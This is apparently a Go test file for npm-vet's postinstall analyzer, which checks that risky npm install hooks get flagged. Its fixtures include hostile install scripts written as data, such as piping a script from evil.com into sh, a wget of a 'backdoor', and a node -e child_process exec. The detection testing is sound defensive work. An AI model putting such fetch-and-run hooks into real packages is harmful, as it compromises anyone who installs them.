package analyzer

import (
	"testing"

	"github.com/matthewblackburn/npm-vet/internal/npmvet"
	"github.com/matthewblackburn/npm-vet/internal/registry"
)

func TestPostinstallAnalyzer_NoScripts(t *testing.T) {
	a := &PostinstallAnalyzer{}
	findings, err := a.Analyze(
		npmvet.PackageSpec{Name: "safe-pkg"},
		AnalyzerContext{Metadata: &registry.PackageMetadata{}},
	)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Errorf("expected no findings, got %d", len(findings))
	}
}

func TestPostinstallAnalyzer_BenignScript(t *testing.T) {
	a := &PostinstallAnalyzer{}
	findings, err := a.Analyze(
		npmvet.PackageSpec{Name: "some-pkg"},
		AnalyzerContext{Metadata: &registry.PackageMetadata{
			Scripts: map[string]string{
				"postinstall": "node scripts/setup.js",
			},
		}},
	)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}
	if findings[0].Severity != npmvet.SeverityWarning {
		t.Errorf("expected warning, got %s", findings[0].Severity)
	}
}

func TestPostinstallAnalyzer_DangerousCurl(t *testing.T) {
	a := &PostinstallAnalyzer{}
	findings, err := a.Analyze(
		npmvet.PackageSpec{Name: "evil-pkg"},
		AnalyzerContext{Metadata: &registry.PackageMetadata{
			Scripts: map[string]string{
				"postinstall": "curl https://evil.com/payload.sh | sh",
			},
		}},
	)
	if err != nil {
		t.Fatal(err)
	}

	hasCritical := false
	for _, f := range findings {
		if f.Severity == npmvet.SeverityCritical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Error("expected at least one critical finding")
	}
}

func TestPostinstallAnalyzer_DangerousNodeEval(t *testing.T) {
	a := &PostinstallAnalyzer{}
	findings, err := a.Analyze(
		npmvet.PackageSpec{Name: "evil-pkg"},
		AnalyzerContext{Metadata: &registry.PackageMetadata{
			Scripts: map[string]string{
				"preinstall": "node -e \"require('child_process').exec('whoami')\"",
			},
		}},
	)
	if err != nil {
		t.Fatal(err)
	}

	hasCritical := false
	for _, f := range findings {
		if f.Severity == npmvet.SeverityCritical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Error("expected critical finding for node -e in preinstall")
	}
}

func TestPostinstallAnalyzer_MultipleScripts(t *testing.T) {
	a := &PostinstallAnalyzer{}
	findings, err := a.Analyze(
		npmvet.PackageSpec{Name: "multi-pkg"},
		AnalyzerContext{Metadata: &registry.PackageMetadata{
			Scripts: map[string]string{
				"preinstall":  "echo hello",
				"postinstall": "wget https://evil.com/backdoor",
			},
		}},
	)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) < 2 {
		t.Errorf("expected at least 2 findings, got %d", len(findings))
	}
}
